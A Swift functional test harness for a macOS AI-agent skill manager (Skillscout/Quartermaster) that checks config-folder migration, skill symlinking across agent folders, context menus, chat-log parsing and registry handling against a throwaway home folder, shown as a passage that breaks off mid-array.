// Compile with the app sources except SkillscoutApp.swift and run inside a separate .app.
// Arguments: a new made-up home folder, an output folder. Never pass your real home.
import AppKit
import SwiftUI
import SQLite3

enum CheckFailure: Error { case failed(String) }

func check(_ condition: @autoclosure () -> Bool, _ message: String) throws {
  guard condition() else { throw CheckFailure.failed(message) }
  print("PASS: \(message)")
}

func writeSkill(_ folder: URL, name: String, tools: String? = nil) throws {
  try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
  let supported = tools.map { "supported_tools: \($0)\n" } ?? ""
  try "---\nname: \(name)\ndescription: Made-up functional check skill\n\(supported)---\n# Demo\n"
    .write(to: folder.appending(path: "SKILL.md"), atomically: true, encoding: .utf8)
}

@main
enum FunctionalCheck {
  @MainActor static var repositoryBackRequests = 0
  @MainActor
  static func main() {
    let home = URL(fileURLWithPath: CommandLine.arguments[1]).standardizedFileURL
    let output = URL(fileURLWithPath: CommandLine.arguments[2])
    guard !FileManager.default.fileExists(atPath: home.path) else {
      fatalError("The functional check requires a new, empty home path")
    }
    setenv("HOME", home.path, 1)
    UserDefaults.standard.set(Tool.allCases.map(\.rawValue), forKey: "tools")
    UserDefaults.standard.set(false, forKey: "autoAnalyze")
    UserDefaults.standard.set(60, forKey: "lookbackDays")
    let app = NSApplication.shared
    app.setActivationPolicy(.regular)
    let host = NSHostingController(rootView: AnyView(EmptyView()))
    host.sceneBridgingOptions = [.toolbars, .title]
    let window = NSWindow(contentRect: CGRect(x: 0, y: 0, width: 1180, height: 760),
      styleMask: [.titled, .closable, .resizable], backing: .buffered, defer: false)
    window.contentViewController = host
    window.center()
    _ = NotificationCenter.default.addObserver(forName: NSApplication.didFinishLaunchingNotification,
      object: nil, queue: .main) { _ in
      MainActor.assumeIsolated {
        window.makeKeyAndOrderFront(nil)
        NSApp.activate()
        Task {
          do {
            try await run(home: home, output: output, host: host, window: window)
            try "All functional checks passed.\n".write(to: output.appending(path: "result.txt"), atomically: true, encoding: .utf8)
          } catch {
            try? "FAILED: \(error)\n".write(to: output.appending(path: "result.txt"), atomically: true, encoding: .utf8)
            print("FAILED: \(error)")
          }
          NSApp.terminate(nil)
        }
      }
    }
    app.run()
  }

  /// The rename to Quartermaster: Skillscout Mod's Library, a repository in it, an agent link to it and a saved
  /// source path move to ~/.config/quartermaster, and the repository still reads and removes as one.
  @MainActor
  static func checkConfigFolderMove(home: URL, modSupport: URL) throws -> [URL] {
    let fm = FileManager.default
    let old = home.appending(path: ".config/skillscout"), new = Paths.configFolder
    let source = old.appending(path: "skills/moved-repository/moved-skill")
    try writeSkill(source, name: "moved-skill")
    try "{}".write(to: old.appending(path: "skills/moved-repository/.skillscout-repository.json"), atomically: true, encoding: .utf8)
    let link = Tool.claude.skillsFolder.appending(path: "moved-skill")
    try fm.createDirectory(at: Tool.claude.skillsFolder, withIntermediateDirectories: true)
    try fm.createSymbolicLink(atPath: link.path, withDestinationPath: source.path)
    let state = try JSONSerialization.data(withJSONObject: ["preferredSources": ["moved-skill": source.path]])
    try state.write(to: modSupport.appending(path: "state.json"))

    SkillInstaller.moveConfigFolder()
    let moved = new.appending(path: "skills/moved-repository/moved-skill")
    try check((try? fm.destinationOfSymbolicLink(atPath: old.path)) == new.path && fm.fileExists(atPath: moved.appending(path: "SKILL.md").path),
      "the Library moves to ~/.config/quartermaster and the old path links to it")
    try check((try? fm.destinationOfSymbolicLink(atPath: link.path)) == moved.path, "agent links follow the moved Library")
    let saved = try JSONSerialization.jsonObject(with: Data(contentsOf: Paths.stateFile)) as? [String: Any]
    try check((saved?["preferredSources"] as? [String: String])?["moved-skill"] == moved.path, "saved source paths follow the moved Library")
    let skill = SkillScanner.scan().first { $0.name == "moved-skill" }
    try check(skill?.copies.contains { $0.folder == link } == true && Paths.libraryRepo(link.resolvingSymlinksInPath()) == "moved-repository",
      "a moved repository still reads as a Library repository")
    SkillInstaller.moveConfigFolder()
    try check((try? fm.destinationOfSymbolicLink(atPath: link.path)) == moved.path, "running the move again changes nothing")
    let trashed = try SkillInstaller.removeRepo(name: "moved-repository")
    try check(!fm.fileExists(atPath: moved.path) && (try? fm.attributesOfItem(atPath: link.path)) == nil,
      "removing a moved repository also removes its relinked agent link")
    return trashed
  }

  @MainActor
  static func checkContextMenus(store: AppStore, home: URL, prefix: String) async throws {
    let fm = FileManager.default
    let name = prefix + "-context-menu"
    let folder = Tool.amp.skillsFolder.appending(path: name)
    try writeSkill(folder, name: name)
    let sharedName = prefix + "-context-shared"
    try writeSkill(Paths.at(".agents/skills/" + sharedName), name: sharedName)
    let protectedName = prefix + "-context-protected"
    try writeSkill(Paths.at(".codex/skills/.system/" + protectedName), name: protectedName)
    let pluginName = prefix + "-context-plugin"
    try writeSkill(Paths.at(".codex/plugins/cache/menu-market/menu-plugin/1.0.0/skills/" + pluginName), name: pluginName)
    let repositoryName = prefix + "-context-repository"
    try writeSkill(Paths.at(".config/quartermaster/skills/menu-repository/" + repositoryName), name: repositoryName)
    try "{}".write(to: Paths.at(".config/quartermaster/skills/menu-repository/.skillscout-repository.json"), atomically: true, encoding: .utf8)
    await store.refreshSkills()
    let originalSets = store.skillsets
    let originalTools = store.tools
    defer { store.skillsets = originalSets; store.tools = originalTools; store.pendingSkillAdd = nil; store.removal = nil }
    let current = Skillset(name: "Current menu set", skills: [name])
    let full = Skillset(name: "Already contains selection", skills: [name])
    let destination = Skillset(name: "Destination menu set")
    store.skillsets = [current, full, destination]

    var openedInLibrary: Skill.ID?
    func menu(_ ids: Set<String>, _ context: SkillListContext) async throws -> NSMenu {
      let menu = NSHostingMenu(rootView: SkillContextMenu(ids: ids, context: context).environment(store)
        .environment(\.openInLibrary, { openedInLibrary = $0 }))
      menu.update()
      try await Task.sleep(for: .milliseconds(150))
      menu.update()
      return menu
    }
    func titles(_ menu: NSMenu) -> [String] { menu.items.filter { !$0.isSeparatorItem }.map(\.title) }
    func invoke(_ title: String, in menu: NSMenu) throws {
      guard let index = menu.items.firstIndex(where: { $0.title == title }) else { throw CheckFailure.failed("Missing menu action: " + title) }
      menu.performActionForItem(at: index)
    }

    let library = try await menu([name], .library)
    try check(titles(library).prefix(2) == ["Add skills…", "Add to skillset"], "Library menu leads with adding tools and skillsets")
    try check(titles(library).contains("Rename…") && !library.items.contains { $0.submenu?.items.contains { $0.title == "Remove everywhere…" } == true },
      "Library menu keeps catalog rename and excludes global installation deletion")
    let activity = try await menu([name], .activity)
    try check(titles(activity).contains("Manage in Global…") && !titles(activity).contains("Add skills…")
      && !titles(activity).contains("Edit SKILL.md…") && !titles(activity).contains("Rename…") && !titles(activity).contains("Add to skillset"),
      "Chat activity menu links to management without editing or adding")
    try check(!titles(activity).contains("Open in Library"), "Chat activity menu hides Open in Library for a skill outside Library")
    let tool = try await menu([name], .global(.amp))
    try check(titles(tool).contains("Remove from Amp…") && titles(tool).contains("Add skills…") && titles(tool).contains("Add to skillset"), "tool menu leads with scoped removal and adding another tool")
    try check(!titles(tool).contains("Rename…") && !titles(tool).contains("Edit SKILL.md…") && !titles(tool).contains("More removal options"), "tool menu has no editing, rename or global removal")
    try invoke("Add skills…", in: tool)
    try check(store.pendingSkillAdd?.excludedTools.isEmpty == true && store.pendingSkillAdd?.tool == .amp && store.pendingSkillAdd?.destination == .global, "unified add action defaults to the current Global agent")
    store.tools = [.amp]
    let noOtherTool = try await menu([name], .global(.amp))
    try check(titles(noOtherTool).contains("Add skills…"), "unified add remains available for another destination with one enabled agent")
    store.tools = originalTools
    let set = try await menu([name], .skillset(current.id))
    try check(titles(set).prefix(3) == ["Remove from this skillset", "Add to another skillset", "Add skills…"], "skillset menu leads with membership actions")
    let destinations = set.items.first { $0.title == "Add to another skillset" }!.submenu!
    try check(titles(destinations) == [destination.name], "skillset destinations exclude current and already-complete sets")
    try check(!titles(set).contains("Rename…") && !titles(set).contains("Remove from tool") && !titles(set).contains("More removal options"), "skillset menu has no installation removal or global rename")
    try invoke("Remove from this skillset", in: set)
    try check(!store.skillsets.first { $0.id == current.id }!.skills.contains(name)
      && fm.fileExists(atPath: folder.appending(path: "SKILL.md").path), "membership menu removal preserves installed files")
    let shared = try await menu([sharedName], .global(.codex))
    let sharedTitle = try await menu([sharedName], .global(.codex)).items.first?.title ?? ""
    try check(sharedTitle.hasPrefix("Remove from Codex and ") && sharedTitle.hasSuffix("…"), "shared provider menu names the other agents that lose the skill")
    try invoke(sharedTitle, in: shared)
    try check(store.removal?.isShared == true, "shared menu action retains truthful removal confirmation")
    let protected = try await menu([protectedName], .global(.codex))
    try check(titles(protected) == ["Reveal in Finder"], "built-in menu retains reveal and hides unsupported actions")
    let plugin = try await menu([pluginName], .global(.codex))
    try check(titles(plugin).contains("Add skills…") && !titles(plugin).contains("Edit SKILL.md…")
      && !titles(plugin).contains("More removal options") && !titles(plugin).contains("Remove from Codex…"),
      "plugin menu supports reuse without editing or uninstalling plugin files")
    let repository = try await menu([repositoryName], .library)
    try check(titles(repository).contains("Add skills…") && !titles(repository).contains("Edit SKILL.md…")
      && !titles(repository).contains("Rename…"), "repository menu supports reuse without editing its managed source")
    let mixed = try await menu([name, protectedName], .global(.amp))
    try check(!titles(mixed).contains("Edit SKILL.md…") && !titles(mixed).contains("Rename…"), "mixed selection hides single-skill editing")
    let unmanaged = try await menu([name], .global(nil))
    try check(titles(unmanaged).first == "Move to Library" && !titles(unmanaged).contains("More removal options"), "Global menu without an agent leads with a safe Library move")
    let original = try String(contentsOf: folder.appending(path: "SKILL.md"), encoding: .utf8)
    try invoke("Move to Library", in: unmanaged)
    try await Task.sleep(for: .milliseconds(300))
    let moved = Paths.at(".config/quartermaster/skills/" + name)
    let text = try String(contentsOf: moved.appending(path: "SKILL.md"), encoding: .utf8)
    try check(text == original && folder.resolvingSymlinksInPath().path == moved.resolvingSymlinksInPath().path,
      "Global menu move preserves content and replaces the tool folder with a Library link")
    await store.refreshSkills()
    let linkedUnmanaged = try await menu([name], .global(nil))
    try check(!titles(linkedUnmanaged).contains("Move to Library"), "Library-linked source is not offered another move")
    try invoke("Open in Library", in: linkedUnmanaged)
    try check(openedInLibrary == name, "Global menu opens a Library-linked skill in Library")
    openedInLibrary = nil
    try invoke("Open in Library", in: try await menu([name], .activity))
    try check(openedInLibrary == name, "Chat activity menu opens the selected skill in Library")
    openedInLibrary = nil
    try invoke("Open in Library", in: try await menu([name], .discovery))
    try check(openedInLibrary == name, "Discovery menu opens the imported skill in Library")
  }

  @MainActor
  static func run(home: URL, output: URL, host: NSHostingController<AnyView>, window: NSWindow) async throws {
    let fm = FileManager.default
    try fm.createDirectory(at: output, withIntermediateDirectories: true)
    let modSupport = home.appending(path: "Library/Application Support/Skillscout Mod")
    let previousSupport = home.appending(path: "Library/Application Support/Skillscout Thawee")
    let originalSupport = home.appending(path: "Library/Application Support/Skillscout")
    for (folder, marker) in [(modSupport, "mod"), (previousSupport, "previous fork"), (originalSupport, "original")] {
      try fm.createDirectory(at: folder, withIntermediateDirectories: true)
      try marker.write(to: folder.appending(path: "migration-check.txt"), atomically: true, encoding: .utf8)
    }
    let configMoveTrash = try checkConfigFolderMove(home: home, modSupport: modSupport)
    let migratedMarker = try String(contentsOf: Paths.appSupport.appending(path: "migration-check.txt"), encoding: .utf8)
    try check(migratedMarker == "mod" && Paths.appSupport.lastPathComponent == "Quartermaster",
      "Quartermaster copies Skillscout Mod's data before older forks'")
    for folder in Tool.allCases.flatMap(\.homeFolders) {
      try fm.createDirectory(at: home.appending(path: folder), withIntermediateDirectories: true)
    }
    let prefix = "functional-" + UUID().uuidString.lowercased()
    let source = home.appending(path: "fixtures/\(prefix)")
    try writeSkill(source, name: prefix, tools: "['claude', \"codex\"]")
    let destination = try await SkillInstaller.install(source: source.path)
    let skipped = try SkillInstaller.linkSkills(in: destination, explicitTools: nil)
    try check(skipped.isEmpty, "repository links skip nothing")
    try check(fm.fileExists(atPath: Tool.codex.skillsFolder.appending(path: prefix).path), "frontmatter links Codex")
    try check(fm.fileExists(atPath: Tool.claude.skillsFolder.appending(path: prefix).path), "frontmatter links Claude")
    try check(!fm.fileExists(atPath: Tool.amp.skillsFolder.appending(path: prefix).path), "frontmatter excludes other tools")
    let installed = SkillScanner.scan().first { $0.name == prefix }!
    try check(installed.primary.root.kind == .managed, "managed copy is the primary source")
    try check(installed.availableIn.contains(.codex), "scanner recognizes installed links")

    let unlinkedName = prefix + "-unlinked"
    let unlinkedSource = home.appending(path: "fixtures/\(unlinkedName)")
    try writeSkill(unlinkedSource.appending(path: "category/demo"), name: unlinkedName)
    _ = try await SkillInstaller.install(source: unlinkedSource.path)
    let unlinked = SkillScanner.scan().first { $0.name == unlinkedName }!
    try check(unlinked.availableIn.isEmpty, "unlinked repository has no agent availability")
    let visible = SkillScanner.scan().filter { $0.isVisible(in: [.codex], includePlugins: false) }
    try check(visible.contains { $0.id == unlinkedName }, "unlinked managed skills stay visible in the library")
    try check(visible.count { $0.managedRepos.contains(unlinkedName) } == 1, "source count includes unlinked nested skills")

    let hiddenName = prefix + "-hidden"
    let hiddenSource = home.appending(path: "fixtures/\(hiddenName)")
    try writeSkill(hiddenSource.appending(path: ".claude/skills/\(hiddenName)"), name: hiddenName)
    _ = try await SkillInstaller.install(source: hiddenSource.path)
    try check(SkillScanner.scan().contains { $0.name == hiddenName && $0.isManaged },
      "managed repositories include hidden Claude skill folders")

    let explicit = home.appending(path: "fixtures/\(prefix)-explicit")
    try writeSkill(explicit, name: prefix + "-explicit", tools: "[claude]")
    _ = try SkillInstaller.linkSkills(in: try await SkillInstaller.install(source: explicit.path), explicitTools: [.copilot])
    try check(fm.fileExists(atPath: Tool.copilot.skillsFolder.appending(path: prefix + "-explicit").path), "explicit target overrides frontmatter")
    let defaultSource = home.appending(path: "fixtures/\(prefix)-default")
    try writeSkill(defaultSource, name: prefix + "-default")
    _ = try SkillInstaller.linkSkills(in: try await SkillInstaller.install(source: defaultSource.path), explicitTools: nil)
    try check(Tool.allCases.allSatisfy { fm.fileExists(atPath: $0.skillsFolder.appending(path: prefix + "-default").path) }, "default installation links all enabled tools")

    let localName = prefix + "-local"
    try writeSkill(Tool.cursor.skillsFolder.appending(path: localName), name: localName)
    let local = SkillScanner.scan().first { $0.name == localName }!
    try SkillInstaller.moveToCentral(local)
    try check(fm.fileExists(atPath: Tool.cursor.skillsFolder.appending(path: localName).appending(path: "SKILL.md").path), "moving to the library preserves the original agent link")
    let movedLocal = SkillScanner.scan().first { $0.name == localName }!
    try check(SkillInstaller.canEdit(movedLocal) && SkillInstaller.canRename(movedLocal) && movedLocal.managedRepos.isEmpty
      && !movedLocal.copies.contains { $0.sourceLabel.hasPrefix("From ") },
      "a skill moved into Library stays editable and is not treated as a repository")
    let repositorySkill = SkillScanner.scan().first { $0.name == prefix + "-default" }!
    let repositoryCopy = repositorySkill.copies.first { $0.root.kind == .managed }!
    let repositoryError = SkillInstaller.Failure.managed(repositoryCopy.resolved).errorDescription ?? ""
    try check(!SkillInstaller.canEdit(repositorySkill) && !SkillInstaller.canRename(repositorySkill)
      && repositoryCopy.sourceLabel.hasPrefix("From ") && repositoryError.contains("Library repository") && !repositoryError.contains("plugin"),
      "a Library repository skill stays protected and its error names the repository")

    let date = ISO8601DateFormatter().string(from: Date())
    let skillFile = Tool.codex.skillsFolder.appending(path: prefix).appending(path: "SKILL.md").path
    let codex = home.appending(path: ".codex/sessions/demo.jsonl")
    try fm.createDirectory(at: codex.deletingLastPathComponent(), withIntermediateDirectories: true)
    let entries: [[String: Any]] = [
      ["type": "session_meta", "payload": ["cwd": "/demo/project"]],
      ["type": "response_item", "timestamp": date, "payload": ["type": "message", "role": "user", "content": [["text": "Please check the made-up demo application"]]]],
      ["type": "response_item", "timestamp": date, "payload": ["type": "function_call", "arguments": "cat \(skillFile)"]],
    ]
    var jsonl = Data()
    for entry in entries {
      jsonl.append(try JSONSerialization.data(withJSONObject: entry, options: [.sortedKeys]))
      jsonl.append(0x0A)
    }
    try jsonl.write(to: codex)
    let antigravity = home.appending(path: ".gemini/antigravity-cli/brain/demo/.system_generated/logs/transcript.jsonl")
    try fm.createDirectory(at: antigravity.deletingLastPathComponent(), withIntermediateDirectories: true)
    let antiEntry: [String: Any] = ["step_index": 1, "type": "USER_INPUT", "created_at": date,
      "content": "Please review the made-up Antigravity project",
      "tool_calls": [["name": "default_api:view_file", "arguments": ["AbsolutePath": skillFile]]]]
    try JSONSerialization.data(withJSONObject: antiEntry).write(to: antigravity)
    var db: OpaquePointer?
    guard sqlite3_open(home.appending(path: ".copilot/session-store.db").path, &db) == SQLITE_OK else { throw CheckFailure.failed("fixture database") }
    let sql = """
      CREATE TABLE sessions (id TEXT, cwd TEXT);
      CREATE TABLE turns (session_id TEXT, timestamp TEXT, user_message TEXT, assistant_response TEXT);
      INSERT INTO sessions VALUES ('demo', '/demo/project');
      INSERT INTO turns VALUES ('demo', '\(date)', 'Please inspect the made-up Copilot application', 'cat \(skillFile)');
      """
    let dbResult = sqlite3_exec(db, sql, nil, nil, nil)
    sqlite3_close(db)
    try check(dbResult == SQLITE_OK, "created fake Copilot database")
    let (prompts, uses) = await PromptLibrary().load(lookbackDays: 60)
    try check(Set(prompts.map(\.tool)) == [.codex, .copilot, .antigravity], "Codex, Copilot and Antigravity chat parsing")
    try check(Set(uses.map(\.tool)) == [.codex, .copilot, .antigravity], "skill usage extracted for all fixture chats")
    let cached = await PromptLibrary().load(lookbackDays: 60)
    try check(cached.prompts.count == prompts.count && cached.uses.count == uses.count, "cached parsing preserves results")

    let store = AppStore()
    await store.start()
    try await checkContextMenus(store: store, home: home, prefix: prefix)
    let libraryOnlyName = prefix + "-discover-library"
    let libraryOnlySource = home.appending(path: "fixtures/\(libraryOnlyName)")
    try writeSkill(libraryOnlySource, name: libraryOnlyName)
    let libraryOnlyPath = try await store.addRepoToLibrary(source: libraryOnlySource.path)
    let libraryOnlySkill = store.skills.first { $0.name == libraryOnlyName }
    try check(fm.fileExists(atPath: libraryOnlyPath.appending(path: "SKILL.md").path)
      && libraryOnlySkill?.isManaged == true && libraryOnlySkill?.isLibraryOnly == true
      && libraryOnlySkill?.isInstalledInAnyTool == false && libraryOnlySkill?.isOutsideLibrary == false,
      "Discover adds a repository to Library without making its skill available to tools")
    try check(Tool.allCases.allSatisfy { !fm.fileExists(atPath: $0.skillsFolder.appending(path: libraryOnlyName).path) },
      "Discover leaves every AI tool folder untouched")
    await store.add(libraryOnlySkill!, to: .codex)
    try check(fm.fileExists(atPath: Tool.codex.skillsFolder.appending(path: libraryOnlyName).path)
      && store.skills.first(where: { $0.name == libraryOnlyName })?.availableIn.contains(.codex) == true,
      "a library skill can be added to an AI tool afterward")
    let linkedLibrarySkill = store.skills.first { $0.name == libraryOnlyName }!
    try check(linkedLibrarySkill.isInstalledInAnyTool && !linkedLibrarySkill.isLibraryOnly
      && !linkedLibrarySkill.isOutsideLibrary && linkedLibrarySkill.isVisible(in: [.amp], includePlugins: false),
      "Library skills linked to disabled tools remain installed and visible")
    let sourceBackup = libraryOnlySource.deletingLastPathComponent().appending(path: libraryOnlyName + "-unavailable")
    try fm.moveItem(at: libraryOnlySource, to: sourceBackup)
    do {
      _ = try await store.redownloadRepo(name: libraryOnlyName)
      throw CheckFailure.failed("missing re-download source should fail")
    } catch SkillInstaller.InstallFailure.notFound {}
    let libraryLink = Tool.codex.skillsFolder.appending(path: libraryOnlyName)
    try check(fm.fileExists(atPath: libraryOnlyPath.appending(path: "SKILL.md").path)
      && fm.fileExists(atPath: libraryLink.appending(path: "SKILL.md").path),
      "failed re-download preserves repository and agent link")
    try fm.moveItem(at: sourceBackup, to: libraryOnlySource)
    try fm.createDirectory(at: libraryOnlySource.appending(path: "other"), withIntermediateDirectories: true)
    try writeSkill(libraryOnlySource.appending(path: "other"), name: prefix + "-replacement")
    try fm.removeItem(at: libraryOnlySource.appending(path: "SKILL.md"))
    do {
      _ = try await store.redownloadRepo(name: libraryOnlyName)
      throw CheckFailure.failed("re-download should reject a missing linked skill")
    } catch SkillInstaller.InstallFailure.linkedSkillMissing(_) {}
    try check(fm.fileExists(atPath: libraryLink.appending(path: "SKILL.md").path),
      "re-download refuses a replacement that breaks a linked skill")
    try writeSkill(libraryOnlySource, name: libraryOnlyName)
    try "updated".write(to: libraryOnlySource.appending(path: "version.txt"), atomically: true, encoding: .utf8)
    let redownloadTrash = try await store.redownloadRepo(name: libraryOnlyName)
    try check(fm.fileExists(atPath: libraryLink.appending(path: "SKILL.md").path)
      && fm.fileExists(atPath: libraryOnlyPath.appending(path: "version.txt").path),
      "successful re-download updates the repository and keeps the agent link")

    let duplicateName = prefix + "-duplicate"
    let repoA = home.appending(path: "fixtures/\(prefix)-repo-a")
    let repoB = home.appending(path: "fixtures/\(prefix)-repo-b")
    try writeSkill(repoA.appending(path: "category/a"), name: duplicateName)
    try writeSkill(repoB.appending(path: "category/b"), name: duplicateName)
    _ = try await store.addRepoToLibrary(source: repoA.path)
    _ = try await store.addRepoToLibrary(source: repoB.path)
    let duplicate = store.skills.first { $0.name == duplicateName }!
    try check(duplicate.managedRepos.count == 2 && SkillInstaller.installableSources(for: duplicate).count == 2,
      "same-name skills remain visible from both repositories")
    let duplicateSet = Skillset(name: "Duplicate source demo", skills: [duplicateName])
    store.skillsets.append(duplicateSet)
    let ambiguousPreview = store.skillsetPreview(duplicateSet, to: .cursor, assigned: true)
    try check(ambiguousPreview.issueDetails.contains { if case .chooseSource = $0.reason { true } else { false } },
      "ambiguous skillset preview exposes typed source-choice recovery")
    try check(ambiguousPreview.issues.contains { $0.contains("choose a source") },
      "skillset preview requires a choice for ambiguous sources")
    let chosen = duplicate.copies.first { $0.sourceLabel.contains(repoB.lastPathComponent) }!
    try check(store.setPreferredSource(chosen, for: duplicate), "source preference is saved")
    try check(store.skillsetPreview(duplicateSet, to: .cursor, assigned: true).additions.map(\.name) == [duplicateName],
      "chosen source enables skillset application")
    await store.add(duplicate, to: .amp, from: chosen)
    try check(Tool.amp.skillsFolder.appending(path: SkillInstaller.slug(duplicateName)).resolvingSymlinksInPath().path == chosen.resolved.path,
      "Add to tool uses the selected repository copy")
    try CustomRegistry.shared.add(repoURL: "https://github.com/android/skills")
    try CustomRegistry.shared.add(repoURL: "https://github.com/tt-a1i/archify")
    await store.loadRegistry()
    try check(store.errorMessage == nil && !store.registrySkills.isEmpty, "Discover loads the bundled registry")
    try check(Set(store.registrySkills.map(\.repo)).isSuperset(of: [
      "https://github.com/android/skills",
      "https://github.com/anthropics/skills",
      "https://github.com/mattpocock/skills",
      "https://github.com/nextlevelbuilder/ui-ux-pro-max-skill",
      "https://github.com/addyosmani/agent-skills",
      "https://github.com/twostraws/SwiftUI-Agent-Skill",
      "https://github.com/tt-a1i/archify.git",
    ]), "Discover includes verified default skill sources")
    // Trimmed from the defaults on 2026-10-21; Archify covers their diagrams and explainers.
    try check(Set(store.registrySkills.map(\.repo)).isDisjoint(with: [
      "https://github.com/cathrynlavery/diagram-design",
      "https://github.com/QingYunA/answer-me-with-html",
      "https://github.com/konraddzbik/architecture-diagram-skill",
      "https://github.com/lewes2/archpresent",
    ]), "Discover no longer lists the trimmed diagram sources by default")
    try check(Set(store.registrySkills.map(\.repo)).isDisjoint(with: [
      "https://github.com/Graphify-Labs/graphify",
      "https://github.com/vercel-labs/agent-skills",
      "https://github.com/humanlayer/skills",
      "https://github.com/cursor/plugins",
      "https://github.com/ComposioHQ/awesome-claude-skills",
    ]), "Removed sources are absent from the default registry")
    try check(store.registrySkills.filter { $0.repo == "https://github.com/android/skills" }.count == 1
      && store.registrySkills.first { $0.repo == "https://github.com/android/skills" }?.author == "Android",
      "bundled sources take precedence over duplicate custom entries")
    let archifyID = RepositoryID(source: .git("https://github.com/tt-a1i/archify.git"))
    try check(store.repositories.filter { $0.id == archifyID }.count == 1
      && store.repositories.first { $0.id == archifyID }?.catalog?.repo == "https://github.com/tt-a1i/archify.git",
      "bundled Archify source replaces an equivalent custom address")
    let localSource = home.appending(path: "fixtures/\(prefix) custom folder")
    let localSkillName = prefix + "-custom-folder-skill"
    try writeSkill(localSource.appending(path: "nested"), name: localSkillName)
    let registeredLocalSource = try CustomRegistry.shared.add(repoURL: localSource.path)
    try check(registeredLocalSource == localSource.path,
      "custom registry accepts a local skills folder")
    let emptyFolder = home.appending(path: "fixtures/empty-folder")
    try fm.createDirectory(at: emptyFolder, withIntermediateDirectories: true)
    try check((try? CustomRegistry.shared.add(repoURL: emptyFolder.path)) == nil,
      "custom registry rejects a folder without skills")
    await store.loadRegistry()
    try check(store.registrySkills.contains { $0.repo == localSource.path && $0.description == "Local skills folder" },
      "Discover shows the local folder")
    try check(store.registeredLocalSources.contains { $0.repo == localSource.path },
      "Sources shows a registered local folder before import")
    let localLibrary = try await store.addRepoToLibrary(source: localSource.path)
    try check(fm.fileExists(atPath: localLibrary.appending(path: "nested/SKILL.md").path)
      && fm.fileExists(atPath: localLibrary.appending(path: ".skillscout-local-source").path),
      "Add to Library copies local skills and remembers their source")
    try check(!store.registeredLocalSources.contains { $0.repo == localSource.path }
      && store.managedRepos.contains(SkillInstaller.repoName(for: localSource.path)),
      "Sources switches to the imported local folder's skill list")
    let localSkill = store.skills.first { $0.name == localSkillName }!
    await store.add(localSkill, to: .codex)
    let localSkillFile = localSource.appending(path: "nested/SKILL.md")
    var updatedLocalSkill = try String(contentsOf: localSkillFile, encoding: .utf8)
    updatedLocalSkill += "\nUpdated in the source folder.\n"
    try updatedLocalSkill.write(to: localSkillFile, atomically: true, encoding: .utf8)
    let refreshTrash = try await store.redownloadRepo(name: SkillInstaller.repoName(for: localSource.path))
    let refreshedLocalSkill = try String(contentsOf: localLibrary.appending(path: "nested/SKILL.md"), encoding: .utf8)
    try check(refreshedLocalSkill.contains("Updated in the source folder.")
      && Tool.codex.skillsFolder.appending(path: SkillInstaller.slug(localSkillName)).appending(path: "SKILL.md").resolvingSymlinksInPath().path == localLibrary.appending(path: "nested/SKILL.md").path,
      "Refresh from Folder updates the library copy without breaking its tool link")
    store.createSkillset(name: "Demo skillset")
    store.toggleSkillInSkillset(skill: installed, skillsetID: store.skillsets[0].id)
    let stateFile = Paths.stateFile
    let stateBackup = home.appending(path: "state-backup.json")
    try fm.moveItem(at: stateFile, to: stateBackup)
    try fm.createDirectory(at: stateFile, withIntermediateDirectories: true)
    let beforeFailedSave = store.skillsets[0].skills
    try check(!store.replaceSkillsetMembers([libraryOnlyName], in: store.skillsets[0].id)
      && store.skillsets[0].skills == beforeFailedSave,
      "failed membership save reports failure and restores the previous members")
    try fm.removeItem(at: stateFile)
    try fm.moveItem(at: stateBackup, to: stateFile)
    store.errorMessage = nil
    let restored = AppStore()
    await restored.start()
    try check(restored.skillsets.first?.skills.contains(prefix) == true, "skillsets survive reloading")
    let skillsetTrash = try await checkSkillsets(store, prefix: prefix)
      + checkSkillsetTransfer(store, prefix: prefix, home: home)
      + checkReviewFixes(store, home: home)
    let installationTrash = try await checkInstallConflicts(store, prefix: prefix) + checkMoveAndRenameSafety(prefix: prefix, home: home)
    await store.refreshSkills()
    let reviewed = try await checkReviewAndUpdates(store, prefix: prefix, home: home)
    let repositoryScenes = try await checkRepositoryWorkflows(store, prefix: prefix, home: home)
    let discoverAvailable = RegistrySkill(name: "Made-up repository", description: "Made-up skills for UI verification",
      repo: "https://example.invalid/made-up-repository", tools: nil, author: "Demo")
    let discoverInLibrary = RegistrySkill(name: libraryOnlyName, description: "Made-up library repository",
      repo: libraryOnlySource.path, tools: nil, author: "Custom")
    let pendingLocalSource = home.appending(path: "fixtures/pending-local-folder")
    try writeSkill(pendingLocalSource, name: "pending-local-skill")
    try CustomRegistry.shared.add(repoURL: pendingLocalSource.path)
    await store.loadRegistry()
    try check(store.registeredLocalSources.contains { $0.repo == pendingLocalSource.path },
      "Sources keeps another registered local folder visible without importing it")
    let discoverLocalAvailable = RegistrySkill(name: "Pending local folder", description: "Made-up local skills for UI verification",
      repo: pendingLocalSource.path, tools: nil, author: "Custom")
    // A made-up Claude Code plugin with a hook and an MCP server.
    let pluginFolder = home.appending(path: ".claude/plugins/cache/demo-market/demo-plugin/1.0.0")
    try fm.createDirectory(at: pluginFolder.appending(path: ".claude-plugin"), withIntermediateDirectories: true)
    try #"{"name":"demo-plugin","description":"Made-up plugin for UI verification","hooks":{"PostToolUse":[{"matcher":"Write","hooks":[{"type":"command","command":"./scripts/format.sh"}]}]},"mcpServers":{"demo":{"command":"node","args":["server.js"]}}}"#
      .write(to: pluginFolder.appending(path: ".claude-plugin/plugin.json"), atomically: true, encoding: .utf8)
    try #"{"version":2,"plugins":{"demo-plugin@demo-market":[{"installPath":"\#(pluginFolder.path)","version":"1.0.0"}]}}"#
      .write(to: home.appending(path: ".claude/plugins/installed_plugins.json"), atomically: true, encoding: .utf8)
    await store.refreshSkills()
    let demoPlugin = store.plugins.first { $0.name == "demo-plugin" }
    try check(demoPlugin?.runs.count == 2 && demoPlugin?.enabled == true, "Plugins lists a plugin's hooks and MCP servers")
    let usabilityScenes = try await checkUsability(store, home: home, prefix: prefix)
    let toolRemoval = try checkToolRemoval(store, prefix: prefix)
    let skillsLockScenes = try await checkSkillsLock(store, prefix: prefix)
    try await checkDiscoveryChoices()
    let reportScenes = try await checkReports(store, prefix: prefix)
    func repositoryEntry(_ source: RegistrySkill) -> RepositoryEntry {
      let id = RepositoryID(source: try! RepositorySource(address: source.repo))
      return RepositoryLibrary.inventory(catalog: [source]).first { $0.id == id }!
    }
    let scenes: [(String, AnyView)] = [
      ("library", AnyView(ContentView(skill: prefix).environment(store))),
      ("library-light", AnyView(ContentView(skill: prefix).environment(store))),
      ("global", AnyView(ContentView(sidebar: .global, skill: libraryOnlyName).environment(store))),
